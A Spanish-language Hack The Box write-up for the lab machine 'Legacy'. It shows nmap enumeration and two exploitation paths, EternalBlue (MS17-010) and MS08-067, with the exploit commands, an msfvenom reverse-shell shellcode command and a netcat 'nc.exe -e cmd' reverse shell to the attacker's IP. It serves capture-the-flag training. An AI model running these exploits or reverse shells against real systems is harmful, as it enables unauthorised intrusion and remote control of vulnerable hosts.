---
title:  "Legacy Writeup [ES] - HackTheBox"
date:   2021-10-25 17:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [cve]
---

[Legacy](https://app.hackthebox.com/machines/2) es una de las box más sencillas de [Hack The Box](https://app.hackthebox.com/). A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla.


## Información


![Info](/images/HTB/Legacy/01-info.png)


## Enumeración

### NMAP

Iniciamos con un escaneo de puertos, utilizando el método TCP SYN para agilizar el proceso.

* ```nmap -p- -sS --min-rate 4000 -n -v -Pn 10.10.10.4 -oG allPorts.gnmap```

```plaintext
Nmap scan report for 10.10.10.4
Host is up (0.15s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds
```

Nos reporta sólo dos puertos abiertos: **139,445**. Con esta información, realizamos un escaner más detallado de los servicios y versiones bajo esos puertos.

* ```nmap -sC -sV -p139,445 10.10.10.4 -oN openPorts.nmap```


```plaintext
Nmap scan report for 10.10.10.4
Host is up (0.14s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h41m11s, deviation: 2h07m16s, median: 4d23h11m11s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:4d:63 (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-10-31T01:25:22+03:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.20 seconds
```

Por último, se ejecutará un escaneo de estos puertos para identificar posibles vulnerabilidades asociadas.

* ```nmap -p139,445 --script "vuln" 10.10.10.4```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 17:40 -03
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4
Host is up (0.14s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 49.62 seconds
```

En base al output podemos identificar que la máquina es vulnerable a lo siguiente:

* MS17-010 (EternalBlue 
* MS08-067

## Ganando acceso

### 1. MS17-010 - EternalBlue

Llegados a este punto el ganar acceso es bastante trivial, se debe explotar la vulnerabilidad EternalBlue descubierta en el paso anterior. Para ello utilizaré el siguiente recurso de [github - MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010).

* ```git clone https://github.com/3ndG4me/AutoBlue-MS17-010```

![Files](/images/HTB/Legacy/03-files.png)

Con estos archivos, lo que haré será ejecutar el **eternal_checker.py** para verificar si existe algún named pipe disponible para la explotación.


* ```python eternal_checker.py 10.10.10.4```

![Checker](/images/HTB/Legacy/05-eternal_checker.png)


Se encuentra el pipe ```browser``` el cual utilizaremos para la explotación con **zzz_exploit.py**.

* ```python zzz_exploit.py 10.10.10.4 -pipe browser```

![Exploit](/images/HTB/Legacy/10-zzz_exploit.png)

Y eso es todo, ya el exploit nos entrega una shell con privilegios de administración. Ahora basta con buscar los archivos .txt con las flags e introducirlas en la plataforma de HTB. Pero antes de esto, es recomendable migrar a otra shell utilizando netcat, ya que dependiendo del comando que se ejecute, la consola se puede colgar.

Para la migración de shell utilizaremos netcat a través de un recurso compartido en red en SMB. Para esto se utilizará **smbserver** de impacket.

* ```impacket-smbserver Shared . -smb2support```

Luego desde nuestra shell en la máquina víctima, basta con ejecutar netcat para crear una nueva conexión.

* ```\\10.10.14.19\Shared\nc.exe -e cmd 10.10.14.19 443```

Y paralelamente abrimos un canal de escucha para la reverse shell.

* ```rlwrap nc -nlvp 443```

![](/images/HTB/Legacy/25-migrating-shell.png)

Para buscar las flags podemos hacer uso de ```dir```.

* ```dir /s /b C:\*root.txt```
* ```dir /s /b C:\*user.txt```

![Exploit](/images/HTB/Legacy/15-flags.png)



### 2. MS08-067

Recordando la fase de enumeración, existía otra vulnerabilidad crítica en la máquina. Esta vulnerabilidad está documentada bajo el código **MS08-067**.

Googleando un poco, nos encontramos con un [recurso de github](https://github.com/andyacer/ms08_067) que nos facilita un exploit que se aprovecha de un **buffer overflow** para entablar una reverse shell a la máquina.

Para comenzar nos clonaremos el reposorio.

* ```git clone https://github.com/andyacer/ms08_067```

![](/images/HTB/Legacy/28-github-content2.png)


Y entraremos al archivo ```ms08-067.py``` donde se encuentran instrucciones para ejecutar correctamente el exploit.

![](/images/HTB/Legacy/29-exploit2.png)

Nos indican que se debe generar un shellcode a través de msfvenom y reemplazarlo dentro del script.

* ```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows```

![](/images/HTB/Legacy/30-shellcode.png)

Luego de hacer el cambio, ejecutamos el exploit.

* ```python2 ms08-067.py```

![](/images/HTB/Legacy/31-exploit-options.png)

Según el ejemplo, se debe ejecutar el script, junto con la IP de nuestro target, el n° de OS y el puerto destino. En nuestro caso utilizaremos la opción n°6 para Windows XP SP3 English con el puerto 445. 

Como siempre, de manera paralela lanzamos un netcat para recibir la conexión de nuestra shell.

![](/images/HTB/Legacy/35-reverse2.png)

Con esto concluye esta máquina de **HackTheBox**, ya que contaríamos con privilegios de administración y podemos proceder a buscar las flags de la misma forma que en el método anterior.